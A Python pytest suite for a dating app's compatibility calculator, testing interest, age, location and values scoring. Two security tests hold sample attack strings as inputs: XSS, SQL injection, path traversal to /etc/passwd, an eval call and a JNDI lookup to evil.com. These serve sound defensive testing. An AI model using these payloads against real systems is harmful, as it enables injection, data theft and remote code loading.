"""
Unit tests for compatibility service algorithms
Tests the local compatibility calculation without database dependencies
"""

import pytest
from app.services.compatibility import CompatibilityCalculator


@pytest.mark.unit
@pytest.mark.soul_connections
class TestCompatibilityCalculator:
    """Test suite for CompatibilityCalculator class"""
    
    @pytest.fixture
    def calculator(self):
        """Create a CompatibilityCalculator instance"""
        return CompatibilityCalculator()
    
    def test_calculator_initialization(self, calculator):
        """Test that calculator initializes with correct weights"""
        assert calculator.weights["interests"] == 0.25
        assert calculator.weights["values"] == 0.30
        assert calculator.weights["demographics"] == 0.20
        assert calculator.weights["communication"] == 0.15
        assert calculator.weights["personality"] == 0.10
        
        # Test value keywords are loaded
        assert "relationship_values" in calculator.value_keywords
        assert "connection_style" in calculator.value_keywords
    
    def test_interest_similarity_identical_interests(self, calculator):
        """Test Jaccard similarity with identical interests"""
        interests1 = ["cooking", "reading", "hiking"]
        interests2 = ["cooking", "reading", "hiking"]
        
        similarity = calculator.calculate_interest_similarity(interests1, interests2)
        assert similarity == 1.0
    
    def test_interest_similarity_no_overlap(self, calculator):
        """Test Jaccard similarity with no overlapping interests"""
        interests1 = ["cooking", "reading", "hiking"]
        interests2 = ["dancing", "swimming", "painting"]
        
        similarity = calculator.calculate_interest_similarity(interests1, interests2)
        assert similarity == 0.0
    
    def test_interest_similarity_partial_overlap(self, calculator):
        """Test Jaccard similarity with partial overlap"""
        interests1 = ["cooking", "reading", "hiking", "music"]
        interests2 = ["cooking", "hiking", "dancing", "art"]
        
        # Intersection: cooking, hiking (2 items)
        # Union: cooking, reading, hiking, music, dancing, art (6 items)
        # Expected: 2/6 = 0.333...
        similarity = calculator.calculate_interest_similarity(interests1, interests2)
        assert abs(similarity - 0.3333333333333333) < 0.0001
    
    def test_interest_similarity_empty_lists(self, calculator):
        """Test Jaccard similarity with empty lists"""
        similarity = calculator.calculate_interest_similarity([], ["cooking"])
        assert similarity == 0.0
        
        similarity = calculator.calculate_interest_similarity(["cooking"], [])
        assert similarity == 0.0
        
        similarity = calculator.calculate_interest_similarity([], [])
        assert similarity == 0.0
    
    def test_interest_similarity_case_insensitive(self, calculator):
        """Test that interest similarity is case insensitive"""
        interests1 = ["Cooking", "READING", "hiking"]
        interests2 = ["cooking", "reading", "HIKING"]
        
        similarity = calculator.calculate_interest_similarity(interests1, interests2)
        assert similarity == 1.0
    
    def test_interest_similarity_with_whitespace(self, calculator):
        """Test that interest similarity handles whitespace"""
        interests1 = [" cooking ", "reading", "hiking "]
        interests2 = ["cooking", " reading", "hiking"]
        
        similarity = calculator.calculate_interest_similarity(interests1, interests2)
        assert similarity == 1.0
    
    def test_calculate_age_compatibility_same_age(self, calculator):
        """Test age compatibility calculation for same age"""
        compatibility = calculator.calculate_age_compatibility(25, 25)
        assert compatibility == 1.0
    
    def test_calculate_age_compatibility_small_difference(self, calculator):
        """Test age compatibility for small age differences"""
        # 1-2 years difference should be 0.9
        assert calculator.calculate_age_compatibility(25, 26) == 0.9
        assert calculator.calculate_age_compatibility(30, 28) == 0.9
    
    def test_calculate_age_compatibility_medium_difference(self, calculator):
        """Test age compatibility for medium age differences"""
        # 3-5 years difference should be 0.8
        assert calculator.calculate_age_compatibility(25, 30) == 0.8
        assert calculator.calculate_age_compatibility(35, 30) == 0.8
        
        # 6-8 years difference should be 0.6
        assert calculator.calculate_age_compatibility(25, 33) == 0.6
        assert calculator.calculate_age_compatibility(40, 32) == 0.6
    
    def test_calculate_age_compatibility_large_difference(self, calculator):
        """Test age compatibility for large age differences"""
        # 9-12 years difference should be 0.4
        assert calculator.calculate_age_compatibility(25, 37) == 0.4
        assert calculator.calculate_age_compatibility(45, 33) == 0.4
        
        # >12 years difference should be 0.2
        assert calculator.calculate_age_compatibility(25, 40) == 0.2
        assert calculator.calculate_age_compatibility(50, 30) == 0.2
    
    def test_calculate_location_compatibility_same_city(self, calculator):
        """Test location compatibility for same city"""
        compatibility = calculator.calculate_location_compatibility("New York", "New York")
        assert compatibility == 1.0
    
    def test_calculate_location_compatibility_case_insensitive(self, calculator):
        """Test location compatibility is case insensitive"""
        compatibility = calculator.calculate_location_compatibility("new york", "New York")
        assert compatibility == 1.0
        
        compatibility = calculator.calculate_location_compatibility("LOS ANGELES", "los angeles")
        assert compatibility == 1.0
    
    def test_calculate_location_compatibility_different_cities(self, calculator):
        """Test location compatibility for different cities"""
        compatibility = calculator.calculate_location_compatibility("New York", "Los Angeles")
        assert compatibility == 0.3  # Default for different cities
    
    def test_calculate_location_compatibility_empty_locations(self, calculator):
        """Test location compatibility with empty locations"""
        compatibility = calculator.calculate_location_compatibility("", "New York")
        assert compatibility == 0.5  # Returns 0.5 for missing data
        
        compatibility = calculator.calculate_location_compatibility("New York", "")
        assert compatibility == 0.5
        
        compatibility = calculator.calculate_location_compatibility("", "")
        assert compatibility == 0.5
    
    def test_calculate_demographic_compatibility(self, calculator):
        """Test overall demographic compatibility calculation"""
        # Mock user data
        user1_data = {"age": 25, "location": "New York"}
        user2_data = {"age": 27, "location": "New York"}
        
        compatibility = calculator.calculate_demographic_compatibility(user1_data, user2_data)
        
        # Expected: (age_score * 0.4) + (location_score * 0.6)
        # age_score = 0.9 (2 year difference)
        # location_score = 1.0 (same city)
        # Expected: (0.9 * 0.4) + (1.0 * 0.6) = 0.36 + 0.6 = 0.96
        assert abs(compatibility - 0.96) < 0.0001
    
    def test_compare_response_values_private_method(self, calculator):
        """Test _compare_response_values method indirectly through values compatibility"""
        # This method is private but we can test it through the public interface
        user1_values = {"relationship_goals": "I want loyalty and commitment"}
        user2_values = {"relationship_goals": "I value faithful relationships"}
        
        # Both mention commitment-related keywords, should have some compatibility
        compatibility = calculator.calculate_values_compatibility(user1_values, user2_values)
        assert compatibility > 0.0
    
    def test_calculate_values_compatibility_identical(self, calculator):
        """Test values compatibility with identical responses"""
        user1_values = {
            "relationship_goals": "I want commitment and growth",
            "life_values": "Family and stability are important"
        }
        user2_values = {
            "relationship_goals": "I want commitment and growth", 
            "life_values": "Family and stability are important"
        }
        
        compatibility = calculator.calculate_values_compatibility(user1_values, user2_values)
        assert compatibility >= 0.5  # Should have reasonable compatibility for similar values
    
    def test_calculate_values_compatibility_different(self, calculator):
        """Test values compatibility with different responses"""
        user1_values = {
            "relationship_goals": "I want commitment and stability",
            "life_values": "Family is everything"
        }
        user2_values = {
            "relationship_goals": "I want adventure and excitement",
            "life_values": "Independence and freedom"
        }
        
        compatibility = calculator.calculate_values_compatibility(user1_values, user2_values)
        assert compatibility < 1.0  # Should be lower due to different values
    
    def test_calculate_values_compatibility_empty_values(self, calculator):
        """Test values compatibility with empty values"""
        compatibility = calculator.calculate_values_compatibility({}, {"key": "value"})
        assert compatibility == 0.0
        
        compatibility = calculator.calculate_values_compatibility({"key": "value"}, {})
        assert compatibility == 0.0
        
        compatibility = calculator.calculate_values_compatibility({}, {})
        assert compatibility == 0.0
    
    def test_calculate_overall_compatibility_high_match(self, calculator):
        """Test overall compatibility calculation for high match"""
        user1 = {
            "age": 25,
            "location": "New York",
            "interests": ["cooking", "reading", "hiking"],
            "core_values": {
                "relationship_goals": "I want commitment and growth",
                "life_values": "Family and stability"
            }
        }
        
        user2 = {
            "age": 26,
            "location": "New York", 
            "interests": ["cooking", "reading", "music"],
            "core_values": {
                "relationship_goals": "I value commitment and personal development",
                "life_values": "Family is important to me"
            }
        }
        
        result = calculator.calculate_overall_compatibility(user1, user2)
        
        assert "total_compatibility" in result
        assert "breakdown" in result
        assert "match_quality" in result
        assert result["total_compatibility"] > 50  # Should be a reasonable match
        
        # Check breakdown components
        breakdown = result["breakdown"]
        assert "interests" in breakdown
        assert "values" in breakdown
        assert "demographics" in breakdown
    
    def test_calculate_overall_compatibility_low_match(self, calculator):
        """Test overall compatibility calculation for low match"""
        user1 = {
            "age": 25,
            "location": "New York",
            "interests": ["cooking", "reading"],
            "core_values": {
                "relationship_goals": "I want commitment and stability"
            }
        }
        
        user2 = {
            "age": 45,
            "location": "Los Angeles",
            "interests": ["dancing", "partying"],
            "core_values": {
                "relationship_goals": "I want adventure and freedom"
            }
        }
        
        result = calculator.calculate_overall_compatibility(user1, user2)
        
        assert result["total_compatibility"] < 70  # Should be a lower match
        assert result["match_quality"] in ["poor", "fair", "good"]
    
    def test_get_match_quality_labels(self, calculator):
        """Test match quality label assignment"""
        assert calculator.get_match_quality_label(0.9) == "excellent"
        assert calculator.get_match_quality_label(0.8) == "very_good"
        assert calculator.get_match_quality_label(0.7) == "very_good"
        assert calculator.get_match_quality_label(0.6) == "good"
        assert calculator.get_match_quality_label(0.5) == "fair"
        assert calculator.get_match_quality_label(0.3) == "poor"
    
    @pytest.mark.performance
    def test_performance_large_datasets(self, calculator):
        """Test performance with larger datasets"""
        import time
        
        # Large interest lists
        large_interests1 = [f"interest_{i}" for i in range(100)]
        large_interests2 = [f"interest_{i}" for i in range(50, 150)]
        
        start_time = time.time()
        similarity = calculator.calculate_interest_similarity(large_interests1, large_interests2)
        end_time = time.time()
        
        # Should complete quickly (under 10ms for 100 items)
        assert (end_time - start_time) < 0.01
        assert 0.0 <= similarity <= 1.0
    
    def test_edge_cases_none_values(self, calculator):
        """Test edge cases with None values"""
        # Should handle None gracefully
        similarity = calculator.calculate_interest_similarity(None, ["cooking"])
        assert similarity == 0.0
        
        similarity = calculator.calculate_interest_similarity(["cooking"], None)
        assert similarity == 0.0
    
    @pytest.mark.security
    def test_input_sanitization_malicious_interests(self, calculator):
        """Test that malicious input in interests is handled safely"""
        # Test script injection attempts
        malicious_interests = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/}"
        ]
        safe_interests = ["cooking", "reading"]
        
        # Should not crash or execute malicious code
        similarity = calculator.calculate_interest_similarity(malicious_interests, safe_interests)
        assert 0.0 <= similarity <= 1.0
    
    @pytest.mark.security
    def test_input_sanitization_malicious_values(self, calculator):
        """Test that malicious input in values is handled safely"""
        malicious_values = {
            "eval_attempt": "eval('malicious_code()')",
            "injection": "'; DROP TABLE users; --",
            "path_traversal": "../../../sensitive_file"
        }
        safe_values = {"relationship_goals": "I want commitment"}
        
        # Should not crash or execute malicious code
        compatibility = calculator.calculate_values_compatibility(malicious_values, safe_values)
        assert 0.0 <= compatibility <= 1.0


@pytest.mark.integration
@pytest.mark.soul_connections
class TestCompatibilityCalculatorIntegration:
    """Integration tests for CompatibilityCalculator with mock user data"""
    
    @pytest.fixture
    def calculator(self):
        """Create CompatibilityCalculator instance"""
        return CompatibilityCalculator()
    
    @pytest.fixture
    def sample_users(self):
        """Create sample user data for integration testing"""
        return [
            {
                "id": 1,
                "age": 25,
                "location": "New York",
                "interests": ["cooking", "reading", "hiking"],
                "core_values": {
                    "relationship_goals": "I want commitment and growth",
                    "life_values": "Family and stability are important"
                }
            },
            {
                "id": 2,
                "age": 27,
                "location": "New York", 
                "interests": ["cooking", "music", "travel"],
                "core_values": {
                    "relationship_goals": "I value commitment and adventure",
                    "life_values": "Balance between work and family"
                }
            },
            {
                "id": 3,
                "age": 35,
                "location": "Los Angeles",
                "interests": ["fitness", "business", "networking"],
                "core_values": {
                    "relationship_goals": "I want success and independence",
                    "life_values": "Career achievement is my priority"
                }
            }
        ]
    
    def test_end_to_end_compatibility_matching(self, calculator, sample_users):
        """Test complete compatibility matching workflow"""
        user1, user2, user3 = sample_users
        
        # Test high compatibility match (user1 & user2)
        high_match = calculator.calculate_overall_compatibility(user1, user2)
        assert high_match["total_compatibility"] >= 60
        assert high_match["match_quality"] in ["good", "very_good", "excellent"]
        
        # Test low compatibility match (user1 & user3)
        low_match = calculator.calculate_overall_compatibility(user1, user3)
        assert low_match["total_compatibility"] <= 50
        assert low_match["match_quality"] in ["poor", "fair"]
    
    def test_batch_compatibility_calculation(self, calculator, sample_users):
        """Test calculating compatibility for multiple user pairs"""
        results = []
        
        # Calculate all possible pairs
        for i in range(len(sample_users)):
            for j in range(i + 1, len(sample_users)):
                result = calculator.calculate_overall_compatibility(
                    sample_users[i], sample_users[j]
                )
                results.append({
                    "user1_id": sample_users[i]["id"],
                    "user2_id": sample_users[j]["id"],
                    "compatibility": result["total_compatibility"]
                })
        
        assert len(results) == 3  # 3 possible pairs from 3 users
        assert all(0 <= result["compatibility"] <= 100 for result in results)
    
    def test_realistic_matching_scenarios(self, calculator):
        """Test realistic user matching scenarios"""
        # High compatibility couple
        compatible_user1 = {
            "age": 28,
            "location": "San Francisco",
            "interests": ["yoga", "meditation", "hiking", "cooking"],
            "core_values": {
                "relationship_goals": "I seek deep emotional connection",
                "life_values": "Mindfulness and personal growth",
                "communication_style": "I prefer meaningful conversations"
            }
        }
        
        compatible_user2 = {
            "age": 30,
            "location": "San Francisco",
            "interests": ["hiking", "cooking", "reading", "wellness"],
            "core_values": {
                "relationship_goals": "Looking for authentic connection",
                "life_values": "Balance and spiritual growth",
                "communication_style": "Deep talks over small talk"
            }
        }
        
        result = calculator.calculate_overall_compatibility(compatible_user1, compatible_user2)
        
        # Should be high compatibility
        assert result["total_compatibility"] >= 70
        assert result["breakdown"]["interests"] >= 50
        assert result["breakdown"]["demographics"] >= 80  # Same city, close age